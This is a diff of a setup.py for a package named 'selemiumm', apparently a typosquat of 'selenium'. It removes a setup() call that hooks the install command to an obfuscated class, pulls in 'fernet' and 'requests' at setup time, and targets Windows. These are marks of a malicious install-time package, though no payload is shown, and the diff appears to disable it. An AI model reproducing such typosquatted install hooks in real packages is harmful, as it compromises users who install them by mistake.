@@ -18,22 +18,5 @@ class yuUheTRQFrDzYGUVpeNlqvxjbfclAppKkPmLnVUjRFJpZwWKNQmJEBJKuSfYAoFxlJEygyibSK
             install.run(self)
 
 
-setup(
-    name="selemiumm",
-    version=VERSION,
-    author="eKDjlJQUZPuaiFr",
-    author_email="YMBjlqxmWk@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': yuUheTRQFrDzYGUVpeNlqvxjbfclAppKkPmLnVUjRFJpZwWKNQmJEBJKuSfYAoFxlJEygyibSKVnHZEkCxcDoCaNnWhWW,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
 
